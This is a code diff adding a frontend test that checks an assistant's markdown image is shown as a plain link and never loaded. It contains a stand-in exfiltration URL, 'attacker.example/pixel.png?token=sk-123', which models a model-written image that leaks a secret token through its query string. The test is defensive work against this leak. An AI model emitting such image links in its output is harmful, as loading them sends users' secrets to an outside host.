@@ -85,6 +85,19 @@ it("shows a member message without the page block it opens with", () => {
   expect(screen.queryByText(/dashboard-page/)).toBeNull();
 });
 
+it("shows an image the model wrote as a link to its full URL and never loads it", () => {
+  const src = "https://attacker.example/pixel.png?token=sk-123";
+  const message = asTestDouble<UIMessage>()({
+    id: "m1",
+    role: "assistant",
+    parts: [{ type: "text", content: `Here you go ![chart](${src})` }],
+  });
+  const { container } = render(<QueryClientProvider client={new QueryClient()}><Turn organizationSlug="acme" scope={scope} message={message} asked={{}} bound={[]} /></QueryClientProvider>);
+  expect(container.querySelector(`img[src="${src}"]`)).toBeNull();
+  expect(container.querySelectorAll("img")).toHaveLength(0);
+  expect(screen.getByRole("link", { name: src }).getAttribute("href")).toBe(src);
+});
+
 it("stops a streaming reply from the composer, and the request it stops is cut", async () => {
   vi.stubGlobal("ResizeObserver", class { observe() {} unobserve() {} disconnect() {} });
   const signals: AbortSignal[] = [];
